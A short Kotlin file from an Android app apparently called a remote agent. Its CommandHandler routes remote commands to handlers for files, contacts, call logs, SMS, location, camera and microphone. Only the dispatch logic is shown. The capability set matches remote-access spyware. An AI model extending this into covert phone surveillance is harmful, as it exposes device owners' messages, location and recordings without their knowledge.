package com.remoteagent.protocol

import android.content.Context
import android.util.Log
import com.remoteagent.protocol.commands.CallLogCommands
import com.remoteagent.protocol.commands.CameraCommands
import com.remoteagent.protocol.commands.CommandExecutor
import com.remoteagent.protocol.commands.ContactsCommands
import com.remoteagent.protocol.commands.DeviceInfoCommands
import com.remoteagent.protocol.commands.FileCommands
import com.remoteagent.protocol.commands.LocationCommands
import com.remoteagent.protocol.commands.MicCommands
import com.remoteagent.protocol.commands.SmsCommands

/**
 * Dispatches [DeviceCommand]s to domain-specific executors under
 * [com.remoteagent.protocol.commands].
 */
class CommandHandler(context: Context) {

    private val executors = HashMap<DeviceCommand.CommandType, CommandExecutor>()

    init {
        FileCommands(context).register(executors)
        ContactsCommands(context).register(executors)
        CallLogCommands(context).register(executors)
        SmsCommands(context).register(executors)
        DeviceInfoCommands(context).register(executors)
        LocationCommands(context).register(executors)
        CameraCommands(context).register(executors)
        MicCommands(context).register(executors)
    }

    fun handleCommand(command: DeviceCommand?): CommandResult {
        if (command?.commandType == null) {
            return CommandResult.failed("Invalid command")
        }

        val executor = executors[command.commandType]
            ?: return CommandResult.failed("Unknown command type: ${command.commandType}")

        return try {
            executor.execute(command)
        } catch (e: Exception) {
            Log.e(TAG, "Command execution failed", e)
            CommandResult.failed(e.message ?: "Command execution failed")
        }
    }

    companion object {
        private const val TAG = "CommandHandler"
    }
}
